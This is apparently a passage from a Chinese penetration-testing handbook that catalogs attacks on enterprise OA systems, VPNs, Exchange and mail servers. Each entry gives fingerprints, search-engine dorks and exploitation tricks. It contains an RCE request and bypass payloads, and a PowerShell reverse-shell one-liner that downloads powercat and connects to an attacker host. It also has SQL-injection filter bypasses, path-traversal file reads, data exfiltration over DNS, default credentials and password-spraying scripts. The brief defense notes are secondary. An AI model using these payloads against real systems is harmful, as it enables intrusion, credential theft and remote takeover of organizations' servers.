Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw 7. 利用技巧 1.其他形式绕过 eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");` 也可以换成 `ex\\u0065c(\"cmd /c dir\"); 2.泛微多数都是windows环境, 反弹shell可以使用pcat powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd 8. 防护方法 1.及时更新泛微补丁 2.拦截/weaver/bsh.servlet.BshServlet目录的访问 泛微OA e-cology SQL注入漏洞1. 漏洞简介 泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC https://weaversrc.vulbox.com/, 情况有所好转 2. 影响组件 泛微OA 3. 漏洞指纹 Set-Cookie: ecology_JSessionId= ecology WorkflowCenterTreeData /mobile/plugin/SyncUserInfo.jsp 4. Fofa Dork app=\"泛微-协同办公OA\" 5. 漏洞分析 泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区https://xz.aliyun.com/t/6531 6. 漏洞利用 泛微OA e-cology WorkflowCenterTreeData前台接口SQL注入漏洞复现数据库小龙人-CSDN博客https://blog.csdn.net/zycdn/article/details/102494037 Tentacle/ecology8_mobile_sql_inject.py at 6e1cecd52b10526c4851a26249339367101b3ca2 · orleven/Tentaclehttps://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py 应用安全 – 软件漏洞 – 泛微OA漏洞汇总 – AdreamWillB – 博客园https://www.cnblogs.com/AtesetEnginner/p/11558469.html /mobile/plugin/SyncUserInfo.jsp 这个也是有问题的, 但由于没有公开的分析报告, 漏洞相对简单, 这里不过多描述 7. 利用技巧 1.在这个漏洞补丁之前大概有几十个前台注入, 都差不多, 因为没公开这里就不细说了 2.泛微的补丁中间改过一次过滤策略, 打完所有补丁的话, 注入就很难了 3.这里可以绕过的原因是泛微某个过滤器初始化错误, 当长度超过xssMaxLength=500的时候就不进入安全检测, 修复以后是xssMaxLength=1000000, 所以随便你填充%0a%0d还是空格都可以绕过注入检测 4.泛微后端数据库版本存在差异, 但是可以通用检测 已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致 所以这里筛选出一个相对通用的检测手法(下面代码是python的\" \"*800 800个空格) \"-1) \"+\" \"*800+ \"union select/**/1, Null, Null, Null, Null, Null, Null, Null from Hrmresourcemanager where loginid=('sysadmin'\" 老版本可以在关键字后面加 /**/ 来绕过sql检测 新版本可以通过加入大量空格/换行来绕过sql检测 mssql, oracle中都有Hrmresourcemanager , 这是管理员信息表 就Hrmresource表中没有用户, Hrmresourcemanager 表中也一定会存在sysadmin账户 所以进行union select的时候一定会有数据 这里也可以使用 \"-1) \"+\" \"*800+ \" or/**/ 1=1 and id&lt;(5\" 这里使用 &lt;5 可以避免信息超过5条, 但是会返回密码等敏感信息, 不建议使用 8. 防护方法 1.及时更新泛微补丁2.泛微最好不要开放到公网3.使用waf拦击 泛微OA 数据库泄露漏洞1. 漏洞简介 泛微OA 在国内的用户很多, 漏洞以前也很多, 但现在在漏洞盒子托管了企业SRC https://weaversrc.vulbox.com/, 情况有所好转 2. 影响组件 泛微OA 3. 漏洞指纹 Set-Cookie: ecology_JSessionId= ecology /mobile/DBconfigReader.jsp 4. Fofa Dork app=\"泛微-协同办公OA\" 5. 漏洞分析 jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞https://github.com/jas502n/DBconfigReader 6. 漏洞利用 linbing/Weaver_Ecology_Oa_Config.py at master · taomujian/linbing[https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver%20Ecology%20OA/Weaver_Ecology_Oa_Config.py](https://github.com/taomujian/linbing/blob/master/flask/app/plugins/Weaver Ecology OA/Weaver_Ecology_Oa_Config.py) 7. 利用技巧 1.虽然是接口返回数据是加密的, 但是因为硬编码密钥的缘故, 解密也很简单, pydes就可以解密, 只是这里pydes本身有个bug, 修复方式 pyDes.des(' ')2.这里解密出来的密码一般都是泛微默认的, 且数据库监听在127.0.0.1上, 用处看个人发挥了3.此外泛微还有一些漏洞, 但是基本最新版都修复了, 由于没公开过, 就让他消失吧 8. 防护方法 1.及时更新泛微补丁 2.泛微最好不要开放到公网 3.使用waf拦截sql注入 通达OA 远程代码执行漏洞1. 漏洞简介 通达OA 在国内的用户也比较多, 虽说代码加了密, 奈何是Zend5.4, 解码很简单, 然后代码中的漏洞就很清楚, 尤其是变量覆盖和注入 2. 影响组件通达OA 3. 漏洞指纹 \"/images/tongda.ico\"&gt; Office Anywhere 20xx版 网络智能办公系统 /ispirit/interface/gateway.php 4. Fofa Dork app=\"通达OA\" 5. 漏洞分析 note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/notehttps://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md 代码审计 | 通达OA 任意用户登录漏洞（匿名RCE）分析 | zroolshttps://www.zrools.org/2020/04/23/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%8C%BF%E5%90%8DRCE%EF%BC%89%E5%88%86%E6%9E%90/ 6. 漏洞利用 note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/notehttps://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞https://github.com/NS-Sp4ce/TongDaOA-Fake-User tools/tongda_v11.4_rce_exp.py at master · zrools/tools 管理员伪造后sql写shellhttps://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_exp.py 7. 利用技巧 1.这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有 绕过disable_function也很简单, 直接调用COM('WScript.shell')组件就ok了 2.文件名结构规则如下 256@2003_ 2055499620|123. php. 对应文件名为 attach/im/2003/2055499620.123.php 因为是windows的, 1.php. 可以绕过黑名单, 写到文件就成了 1.php (这里是文件包含, 文件名无所谓) 3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个 (我们看标题挖漏洞, 全网第一时间推送了带复现截图的漏洞通告, 也引发了大家不少讨论) 通达OA前台任意用户伪造登录漏洞https://vas.riskivy.com/vuln-detail?id=33 NS-Sp4ce/TongDaOA-Fake-User: 通达OA 任意用户登录漏洞https://github.com/NS-Sp4ce/TongDaOA-Fake-User 8. 防护方法 1.及时更新补丁 2.使用waf拦截 致远 OA A8 htmlofficeservlet getshell 漏洞1. 漏洞简介 致远 OA 在国内的用户也比较多, 2019年攻防演练暴出来 htmlofficeservlet getshell 漏洞 2. 影响组件致远 OA 3. 漏洞指纹 /seeyon/htmlofficeservlet /seeyon/index.jsp seeyon 4. Fofa Dork app=\"用友-致远OA\" 5. 漏洞分析 致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Bloghttp://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/ 6. 漏洞利用 timwhitez/seeyon-OA-A8-GetShell: 致远OA A8 某些版本批量getshell漏洞/seeyon OA A8 some version getshell from url listhttps://github.com/timwhitez/seeyon-OA-A8-GetShell 致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Bloghttp://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/ 这里还有个XXE 致远OA帆软报表组件前台XXE漏洞(0day)挖掘过程 LandGrey’s Bloghttps://landgrey.me/blog/8/ 7. 利用技巧 1.这个漏洞也挺有意思的, 这个接口是一个金格iweboffice用来处理文件的, 属于一个第三方接口暴露导致的安全问题 这个漏洞网传的脚本都是一个文件名test123456.jsp, 很容易被人锤啊 这里贴一个小脚本可以加解密文件名属性之类的, 算法也很简单, 漏洞通告的当天就写出来了, 就是一个换了码表的base64 from sys import argv letters = \"gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6\" def base64_encode(input_str): str_ascii_list = ['{:0&gt;8}'.format(str(bin(ord(i))).replace('0b', '')) for i in input_str] output_str = '' equal_num = 0 while str_ascii_list: temp_list = str_ascii_list[:3] if len(temp_list) != 3: while len(temp_list) &lt; 3: equal_num += 1 temp_list += ['0' * 8] temp_str = ''.join(temp_list) temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]] temp_str_list = [int(x, 2) for x in temp_str_list] if equal_num: temp_str_list = temp_str_list[0:4 - equal_num] output_str += ''.join([letters[x] for x in temp_str_list]) str_ascii_list = str_ascii_list[3:] output_str = output_str + '=' * equal_num return output_str def base64_decode(input_str): str_ascii_list = ['{:0&gt;6}'.format(str(bin(letters.index(i))).replace('0b', '')) for i in input_str if i != '='] output_str = '' equal_num = input_str.count('=') while str_ascii_list: temp_list = str_ascii_list[:4] temp_str = ''.join(temp_list) if len(temp_str) % 8 != 0: temp_str = temp_str[0:-1 * equal_num * 2] temp_str_list = [temp_str[x:x + 8] for x in [0, 8, 16]] temp_str_list = [int(x, 2) for x in temp_str_list if x] output_str += ''.join([chr(x) for x in temp_str_list]) str_ascii_list = str_ascii_list[4:] return output_str if __name__ == \"__main__\": if len(argv) == 2: print(base64_decode(argv[1])) elif len(argv) == 3: if argv[1] == '-d': print(base64_decode(argv[2])) else: print(base64_encode(argv[2])) else: print(\"Seeyon OA /seeyon/htmlofficeservlet param encode/decode\") print(\"Usage:\") print(\"python %s encoded_str\" % argv[0])t print(\"python %s -d encoded_str\" % argv[0]) print(\"python %s -e raw_str\" % argv[0]) 8. 防护方法 1.及时更新补丁 2.使用waf拦截 [致远OA] 帆软报表 seeyonreport 远程代码执行1. 漏洞简介 帆软报表 (seeyonreport) 很多时候会跟合致远OA一起出现, 通常用户还不知道, 所以这里有几个漏洞点 2. 影响组件 帆软报表 seeyonreport 3. 漏洞指纹 https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892 seeyonreport 4. Fofa Dork app=\"用友-致远OA\" 5. 漏洞分析 帆软报表v8.0 Getshell漏洞分析 | ADog’s Bloghttp://foreversong.cn/archives/1378 6. 漏洞利用 帆软报表v8.0 Getshell漏洞分析 | ADog’s Bloghttp://foreversong.cn/archives/1378 xray/finereport-directory-traversal.yml at master · chaitin/xrayhttps://github.com/chaitin/xray/blob/master/pocs/finereport-directory-traversal.yml7. 利用技巧 1.未设置密码或者读取读取管理员密码https://seeyoon.com/seeyonreport/ReportServer?op=fs_load&amp;cmd=fs_signin&amp;_=1560911828892 这里很有可能是没有设置密码的, 修改密码进入后台就可以了 如果设置里密码, 尝试这个接口 /report/ReportServer?op=chart&amp;cmd=get_geo_json&amp;resourcepath=privilege.xml, 读取管理员密码, 然后使用上文的解密程序解密 2.后台getshell这种后台能装插件的都随便getshell 先去下载一个指定版本的jar包 本地测试环境是9.0 下载com.fr.plugin.external-1.3.4.ziphttps://shop.finereport.com/plugin/2d36b210-2a59-4940-8c4f-f3f16d58cd66 http://shopps.finereport.com/com.fr.plugin.external-1.3.4.zip?e=1561433162&amp;token=GYG9vMioxqbEgx-5HoAMAelD0zGdUrXT4UZ3w-d1:N-PeIkhKkjCY7LHdqelnSvp_LmA= 编译一个恶意的LocaleFinder.class打包进去 复制LocaleFinder.class到\\com.fr.plugin.external-1.3.4.zip\\fr-plugin-external-1.3.4\\fr-plugin-external-1.3.4.jar\\com\\fr\\plugin\\external\\locale\\ 进入到插件管理界面, 上传符合规范的jar包插件即可没生效就访问一下 https://xxxx/seeyonreport/ReportServer?op=im 一般后台都是win, 可以直接使用powershell进行反弹shell powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c vps_ip -p 6666 -e cmd 8. 防护方法 1.及时更新补丁 2.使用waf拦截 第二节Smartbi 前台SQL注入1. 漏洞简介 Smartbi /vision/RMIServlet 接口存在SQL注入, 无需身份认证的攻击者可利用该漏洞查看数据库中的敏感信息或删除任意用户. 2. 影响组件Smartbi 3. 漏洞指纹 SmartBi 4. Fofa Dork app=\"Smartbi\" 5. 漏洞分析 Smartbi软件SQL注入漏洞安全修复通报（厂商已修复）https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ 漏洞文件vision/userListManager.jsp function doDel(){ var ids = []; // 全选 if($(\"#checkAll\").checked){ if(curRows){ curRows.forEach(function(val, index){ ids.push(val.id); }); } }else{ if(curRows){ $(\"[name='checkTr']\").each(function(){ if(this.checked){ ids.push(this.id); } }); } } if(ids &amp;&amp; ids.length &gt; 0){ if(!canOpt()){ alert(\"&lt;%=StringUtil.getLanguageValue(\"Youdonothavepermissiontodoso\")%&gt;\"); return; } var msg = \"&lt;%=StringUtil.getLanguageValue(\"Suredelete?\")%&gt;\"; var flags = modalWindow.MB_YESNO | modalWindow.MB_ICONQUESTION; alert(msg, \"&lt;%=StringUtil.getLanguageValue(\"Removetips\")%&gt;\", flags, function(ret) { if (ret == modalWindow.ID_YES) { var ret = jsloader.resolve(\"freequery.common.util\").remoteInvokeEx2(\"BIConfigService\", \"delUsers\", [ids]); if(ret &amp;&amp; ret.result == 1){ alert(\"&lt;%=StringUtil.getLanguageValue(\"Deletedsuccessfully\")%&gt;\"); refresh(); } } }, this); }else{ alert(\"&lt;%=StringUtil.getLanguageValue(\"Noselectedobjectyouwanttodelete\")%&gt;\"); } } smartbi/WEB-INF/lib/smartbi-BIConfig.jar!/smartbi/config/BIConfigService.class public int delUsers(List&lt;String&gt; ids) { boolean succ = true; String idStr = \"\"; if (ids != null &amp;&amp; ids.size() &gt; 0) { for(int i = 0; i &lt; ids.size(); ++i) { if (i == 0) { idStr = \"('\" + (String)ids.get(i) + \"'\"; } else { idStr = idStr + \", \" + \"'\" + (String)ids.get(i) + \"'\"; } } idStr = idStr + \")\"; Connection conn = null; PreparedStatement prep = null; Object rs = null; try { conn = DbUtil.getRepoConnection(); conn.setAutoCommit(false); String sqlUser = \"delete from t_user where c_userid in \" + idStr; String sqlUserAttr = \"delete from t_userattr where c_userid in \" + idStr; String sqlUserconfig = \"delete from t_userconfig where c_userid in \" + idStr; String sqlUserRole = \"delete from t_user_role where c_userid in \" + idStr; String sqlUserGroup = \"delete from t_group_user where c_userid in \" + idStr; prep = conn.prepareStatement(sqlUser); prep.execute(); prep = conn.prepareStatement(sqlUserAttr); prep.execute(); prep = conn.prepareStatement(sqlUserconfig); prep.execute(); prep = conn.prepareStatement(sqlUserRole); prep.execute(); prep = conn.prepareStatement(sqlUserGroup); prep.execute(); conn.commit(); } catch (Exception var17) { try { succ = false; conn.rollback(); } catch (SQLException var16) { throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17); } throw new SmartbiException(ConfigErrorCode.DELETE_FAILED, var17); } finally { DbUtil.closeDBObject((ResultSet)rs, prep, conn); } return succ ? 1 : 0; } else { return 1; } } 6. 漏洞利用 这里是delete 注入, 不建议使用, 没看到有公开的利用信息, 就不写EXP了 7. 利用技巧 1.RMIServlet加解密代码 虽然利用不能写EXP, 这里写一个RMIServlet 的加解密代码 ENCODING_SCHEDULE = { \"0\": \"7\", \"1\": \"1\", \"2\": \"u\", \"3\": \"N\", \"4\": \"K\", \"5\": \"J\", \"6\": \"M\", \"7\": \"9\", \"8\": \"'\", \"9\": \"m\", \"!\": \"P\", \"%\": \"/\", \"'\": \"n\", \"(\": \"A\", \")\": \"E\", \"*\": \"s\", \"+\": \"+\", \"-\": \"f\", \".\": \"q\", \"A\": \"O\", \"B\": \"V\", \"C\": \"t\", \"D\": \"T\", \"E\": \"a\", \"F\": \"x\", \"G\": \"H\", \"H\": \"r\", \"I\": \"c\", \"J\": \"v\", \"K\": \"l\", \"L\": \"8\", \"M\": \"F\", \"N\": \"3\", \"O\": \"o\", \"P\": \"L\", \"Q\": \"Y\", \"R\": \"j\", \"S\": \"W\", \"T\": \"*\", \"U\": \"z\", \"V\": \"Z\", \"W\": \"!\", \"X\": \"B\", \"Y\": \")\", \"Z\": \"U\", \"a\": \"(\", \"b\": \"~\", \"c\": \"i\", \"d\": \"h\", \"e\": \"p\", \"f\": \"_\", \"g\": \"-\", \"h\": \"I\", \"i\": \"R\", \"j\": \".\", \"k\": \"G\", \"l\": \"S\", \"m\": \"d\", \"n\": \"6\", \"o\": \"w\", \"p\": \"5\", \"q\": \"0\", \"r\": \"4\", \"s\": \"D\", \"t\": \"k\", \"u\": \"Q\", \"v\": \"g\", \"w\": \"b\", \"x\": \"C\", \"y\": \"2\", \"z\": \"X\", \"~\": \"e\", \"_\": \"y\", } DECODING_SCHEDULE = { \"7\": \"0\", \"1\": \"1\", \"u\": \"2\", \"N\": \"3\", \"K\": \"4\", \"J\": \"5\", \"M\": \"6\", \"9\": \"7\", \"'\": \"8\", \"m\": \"9\", \"P\": \"!\", \"/\": \"%\", \"n\": \"'\", \"A\": \"(\", \"E\": \")\", \"s\": \"*\", \"+\": \"+\", \"f\": \"-\", \"q\": \".\", \"O\": \"A\", \"V\": \"B\", \"t\": \"C\", \"T\": \"D\", \"a\": \"E\", \"x\": \"F\", \"H\": \"G\", \"r\": \"H\", \"c\": \"I\", \"v\": \"J\", \"l\": \"K\", \"8\": \"L\", \"F\": \"M\", \"3\": \"N\", \"o\": \"O\", \"L\": \"P\", \"Y\": \"Q\", \"j\": \"R\", \"W\": \"S\", \"*\": \"T\", \"z\": \"U\", \"Z\": \"V\", \"!\": \"W\", \"B\": \"X\", \")\": \"Y\", \"U\": \"Z\", \"(\": \"a\", \"~\": \"b\", \"i\": \"c\", \"h\": \"d\", \"p\": \"e\", \"_\": \"f\", \"-\": \"g\", \"I\": \"h\", \"R\": \"i\", \".\": \"j\", \"G\": \"k\", \"S\": \"l\", \"d\": \"m\", \"6\": \"n\", \"w\": \"o\", \"5\": \"p\", \"0\": \"q\", \"4\": \"r\", \"D\": \"s\", \"k\": \"t\", \"Q\": \"u\", \"g\": \"v\", \"b\": \"w\", \"C\": \"x\", \"2\": \"y\", \"X\": \"z\", \"e\": \"~\", \"y\": \"_\", } #此函数可以用来加密明文也可以解密服务器返回的密文 def encode(code): out = \"\" for item in code: out = out + ENCODING_SCHEDULE.get(item, item) return out def decode(code): out = \"\" for item in code: out = out + DECODING_SCHEDULE.get(item, item) return out 2.该系统还有几处漏洞, 比如默认口令 demo/demo manager/demo admin/admin admin/manager admin/2manager 3.默认路径 http://127.0.0.1:18080/smartbi/vision/config.jsp` 可能未修改密码或者密码为`manager 4.进入后台目录遍历 http://127.0.0.1:18080/smartbi/vision/chooser.jsp?key=CONFIG_FILE_DIR&amp;root=C%3A%2F 同样是后台可以加载插件, 怎么getshell不用我多说了吧 8. 防护方法 1.及时更新补丁 2.使用强口令 3.版本最好为最新版8.5以上, v7还有其他漏洞 深信服VPN远程代码执行1. 漏洞简介 深信服 VPN 某个特定产品存在远程代码执行, 2019 攻防演练使用过 2. 影响组件深信服 VPN 3. 漏洞指纹 Set-Cookie: TWFID= welcome to ssl vpn Sinfor 4. Fofa Dork header=\"Set-Cookie: TWFID=\" 5. 漏洞分析 深信服vpnweb登录逆向学习 – potatso – 博客园https://www.cnblogs.com/potatsoSec/p/12326356.html 6. 漏洞利用 wget -t %d -T %d --spider %s 分析一下上面文章就ok, 比较简单的命令注入 7. 利用技巧 1.该版本深信服VPN属于相对早期的版本, 大概2008年左右, 但目前还有761个ip开放在公网 2.该版本较低, whomai不存在, 可以使用 uname, 这里没有空格可dns传出来 3.去除空格也简单 cat /etc/passwd | tr \" \\n\" \"+|\" 8. 防护方法 1.及时更新补丁 2.升级到最新版 深信服 VPN 口令爆破1. 漏洞简介 深信服 VPN 针对口令爆破是5次错误锁定IP五分钟, 所以这里爆破也不是不行, 主要是测试常见弱口令以及分布式爆破也不是不行 2. 影响组件深信服 VPN 3. 漏洞指纹 /por/login_auth.csp?apiversion=1 sangfor /cgi-bin/login.cgi?rnd= 4. Fofa Dork app=\"深信服-SSL-VPN\" 5. 漏洞分析 关于SSL VPN认证时的验证码绕过 – SSL VPN/EMM – 深信服社区https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=20633 此处存疑, 时间问题没有测试 6. 漏洞利用 1.深信服VPN 口令爆破 demo (这里仅测试了M6,其他的应该差不多) #encoding=utf8 import requests import hashlib import urllib3 urllib3.disable_warnings() import re session = requests.session() def SanForLogin(target, password, username=\"admin\"): # 加密密码的算法是 sha1(password+sid) # 没有公开POC就不写了 SanForLogin(\"https://xxxxxxxxxxx/\", \"admin\") 7. 利用技巧 1.由于深信服涉及的版本跨度时间达十几年, 很多地方不一样, 但是总体都差不太多 国外APT组织应该也批量爆破了一波 加密的密码也就是 sha1(password+sid) 爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些 admin/123456/Sangfor/Sangfor@123 2.如果爆破出来了管理员密码, 管理员后台有好多处命令注入, 比如升级工具, 这里讲起来应该是正常功能 3.去年传闻还有前台sql注入, 但是没拿到补丁, 手头没环境, 就没分析, 看一下乌云上的老洞吧 深信服SSL VPN外置数据中心敏感信息泄漏&amp;SQL注入漏洞可导致getshell – 体验盒子 – 关注网络安全https://www.uedbox.com/post/31092/ 8. 防护方法 1.及时更新补丁 2.升级到最新版 Fortigate SSL VPN 文件读取/远程代码执行1. 漏洞简介 Fortigate SSL VPN 在全球用户量巨大, 去年橘子哥发现了文件读取和远程代码执行漏洞 2. 影响组件Fortigate SSL VPN 3. 漏洞指纹 Fortigate 4tinet2095866 4. Fofa Dork \"Fortigate\" &amp;&amp; port=10443 5. 漏洞分析 Orange: Attacking SSL VPN – Part 2: Breaking the Fortigate SSL VPNhttps://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html?m=1 6. 漏洞利用 密码读取 milo2012/CVE-2018-13379: CVE-2018-13379https://github.com/milo2012/CVE-2018-13379 任意密码重置, 这肯定是个后门 milo2012/CVE-2018-13382: CVE-2018-13382https://github.com/milo2012/CVE-2018-13382 7. 利用技巧 1.文件读取的路径构造 https://xxxxxx:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession 如下padding可以构造出来任意文件读取, 可以读取其他文件, 注意这个系统好像没有/etc/passwd print(\"/../../../../\"+(raw_input().rjust(35, '/'))) 2.寻找魔术数字 虽然当时橘子哥没有公开魔术数字, 但是当时随手分析了一下下面这个启动文件, 搜索一下magic就找到 4tinet2095866, https://xxxxxxxx:10443/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd 后来发现这个字符串在js里面也有, 直接从前台分析也可以获得 https://xxxxx:10443/sslvpn/js/login.js?q=5f9a6877fd1f78da768239aae6e739c2 8. 防护方法 1.及时更新补丁 2.升级到最新版 Pulse Secure SSL VPN远程代码执行漏洞1. 漏洞简介 Pulse Secure SSL VPN 在全球用户量巨大, 去年橘子哥发现了很多漏洞 2. 影响组件 Pulse Secure SSL VPN 3. 漏洞指纹 Pulse Secure SSL VPN 4. Fofa Dork app=\"PulseSecure-SSL-VPN\" 5. 漏洞分析 Pulse Secure SSL VPN远程代码执行漏洞利用与分析 – 安全客, 安全资讯平台https://www.anquanke.com/post/id/185773 6. 漏洞利用 projectzeroindia/CVE-2019-11510: Exploit for Arbitrary File Read on Pulse Secure SSL VPN (CVE-2019-11510)https://github.com/projectzeroindia/CVE-2019-11510 0xDezzy/CVE-2019-11539: Exploit for the Post-Auth RCE vulnerability in Pulse Secure Connecthttps://github.com/0xDezzy/CVE-2019-11539 7. 利用技巧 8. 防护方法 1.及时更新补丁 2.升级到最新版 Palo Alto GlobalProtect VPN远程代码执行漏洞1. 漏洞简介 Palo Alto GlobalProtect 在全球用户量巨大, 去年橘子哥发现了很多漏洞 2. 影响组件Palo Alto GlobalProtect 3. 漏洞指纹 GlobalProtect Portal 4. Fofa Dork app=\"PaloAlto-GlobalProtect\" 5. 漏洞分析 Orange: Attacking SSL VPN – Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html Palo Alto GlobalProtect上的PreAuth RCE – 渗透测试中心 – 博客园https://www.cnblogs.com/backlion/p/11209054.html 6. 漏洞利用 securifera/CVE-2019-1579https://github.com/securifera/CVE-2019-1579 7. 利用技巧 1.这个扫描的话可以判断 /global-protect/portal/css/login.css` `/images/logo_pan_158.gif Last-Modified 是否早于于2018年 curl -s -I https://sslvpn/global-protect/portal/css/login.css | grep Last-Modified Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT 8. 防护方法 1.及时更新补丁 2.升级到最新版 Citrix Gateway/ADC 远程代码执行漏洞 (CVE-2019-19781)1. 漏洞简介 Citrix Gateway/ADC 在全球拥有很多的大客户. 这也是个很经典的灯下黑漏洞(后门) 2. 影响组件 Citrix Gateway/ADC 3. 漏洞指纹 Citrix Gateway/ADC 4. Fofa Dork app=\"Citrix-Netscaler\" 5. 漏洞分析 Citrix Gateway/ADC 远程代码执行漏洞分析 – FreeBuf互联网安全新媒体平台https://www.freebuf.com/news/232752.html 6. 漏洞利用 trustedsec/cve-2019-19781: This is a tool published for the Citrix ADC (NetScaler) vulnerability. We are only disclosing this due to others publishing the exploit code first.https://github.com/trustedsec/cve-2019-19781 7. 利用技巧 1.通过以下命令可以快速断定 curl https://host/vpn/../vpns/cfg/smb.conf --path-as-is --insecure 这里部分版本不需要进行../跳转也可以, 具体原因没有分析 8. 防护方法 1.及时更新补丁 2.升级到最新版 3.暂时屏蔽未授权用户对/vpns/路径的访问 齐治堡垒机相关漏洞1. 漏洞简介 齐治堡垒机是国内使用比较多的堡垒机产品, 后端使用PHP编写 2. 影响组件齐治堡垒机 3. 漏洞指纹 shterm 4. Fofa Dork app=\"shterm-堡垒机\" 5. 漏洞分析 审计某系统从解密到GetShell – 云+社区 – 腾讯云https://cloud.tencent.com/developer/article/1448700 齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记http://kfbiji.com/article/65b98114903248eb 6. 漏洞利用 齐治堡垒机远程命令执行漏洞（CNVD-2019-20835）分析 – 开发笔记http://kfbiji.com/article/65b98114903248eb 7. 利用技巧 1.齐治堡垒机默认口令:shterm/shterm 2.普通用户获取堡垒机权限, 登录之后可尝试命令注入 如果有类似chrome的应用可以直接使用ctrl+o打开窗口, 然后新建bat, 起一个cmd或者其他的程序 8. 防护方法 1.及时更新补丁 2.升级到最新版 3.做好权限控制 Exchange 相关漏洞1. 漏洞简介 Exchange 是企业用量很大的邮件服务器, 包括一个登录后用户伪造(CVE-2018-8581, 利用难度高)和登录后反序列化漏洞(CVE-2020-0688, 利用难度低) 2. 影响组件Exchange 3. 漏洞指纹 Exchange outlook 4. Fofa Dork app=\"Microsoft-Exchange\" 5. 漏洞分析 微软Exchange爆出0day漏洞, 来看POC和技术细节 – FreeBuf互联网安全新媒体平台https://www.freebuf.com/vuls/195162.html Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析https://paper.seebug.org/804/ 微软Exchange服务器远程代码执行漏洞复现分析[CVE-2020-0688] – 先知社区https://xz.aliyun.com/t/7299 6. 漏洞利用 Ridter/Exchange2domain: CVE-2018-8581https://github.com/Ridter/Exchange2domain Ridter/cve-2020-0688: cve-2020-0688https://github.com/Ridter/cve-2020-0688 pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formattershttps://github.com/pwntester/ysoserial.net 7. 利用技巧 1.寻找企业的Exchange有个技巧 除了访问以下域名或者直接查找 DNS MX 记录 mail.domain.com mail1.domain.com mail-hk.domain.com owa.domain.com exchange.domain.com email.domain.com outlook.domain.com 还有个很好用的域名, 这是outlook的自动发现域名 autodiscover.domain.com 2.爆破Exchange 这里两个漏洞都需要登录, 其实这个的弱口令不是很难找, 经常会成为企业的突破口 通常这里的密码能横穿内网, 比如 VPN, OA, SSO Exchange通常有以下几个接口 /owa 前台web登录, 一般可以爆破 /ews 这里是ews的接口, 可以进行401认证爆破, 只需要(域)账号和密码, 不需要知道域名前缀, 更方便爆破 /autodiscover/autodiscover.xml 自动发现接口, 同ews爆破 3.爆破工具可使用 owa用burp, ews用ruler, awvs(比较好用) sensepost/ruler: A tool to abuse Exchange serviceshttps://github.com/sensepost/ruler 4.弱口令爆破技巧, 爆破Exchange相对比较好用, 直接生成企业特色弱口令 import itertools prefix = ['baidu', 'Baidu'] for x in [''.join(x) for x in list(itertools.product(prefix, ['@', ''], ['2019', '2020', '2018', '123', '1234', '123456'], ['!', '', '.']))] : print(x) baidu@2019! baidu@2019 baidu@2019. baidu@2020! baidu@2020 ......... Baidu123456 Baidu123456. 8. 防护方法 1.及时更新补丁 2.升级到最新版 3.做好权限控制 Coremail 相关漏洞1. 漏洞简介 Coremail 是国内使用量很大的邮件服务商, 包括网易邮箱的后端使用的也是coremail 2. 影响组件Coremail 3. 漏洞指纹 Coremail 4. Fofa Dork app=\"Coremail\" 5. 